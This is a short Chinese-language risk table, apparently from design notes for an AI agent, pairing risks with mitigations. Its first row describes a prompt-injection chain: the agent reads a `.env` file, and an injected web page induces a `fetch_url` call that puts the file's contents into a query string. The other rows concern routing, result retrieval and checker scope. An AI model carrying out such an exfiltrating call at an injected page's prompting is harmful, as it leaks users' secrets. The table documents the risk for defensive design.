| **数据外泄链路**（决 3 × `fetch_url`） | 读到 `.env` → 外部网页注入诱导 `fetch_url("…?d=<内容>")`，全程不需要创建任何授权 | 三条护栏（§0.1 修订 2）＋ 批 2 D 段判据。**单人本地开发期接受残余风险，但必须在 Trace 上可审计** |
| **新射程上思考短板暴露** | 决 6 的四条证据全来自「目录元数据盘点」这一种极简任务形态；批 1 后射程翻倍、S13 复杂度上台阶 | **处置不是阶段内加编排**（违反决 6），而是**如实记录证据、留评测阶段判定**。写下这条，既防实施者私自加 Planner，也防反过来无视证据 |
| **组合器路由漏方法** | `observePre` 未路由 → 分支二静默退化成分支三，**无报错、盘上看不出来** | 批 1 E 段判别力实测（改坏必须翻红） |
| **大结果外置成为新的信息阻断** | 外置了但取不回来 | `read_blob`（S6.5）＋ 批 2 A 段「逐字比对取回内容」 |
| **Artifact 检查器滑向业务规则** | 从「ZIP 能否解开」滑到「清单里要有合计」 | 不得绕过 #8；§0.3 的误判是现成的反面教材 |
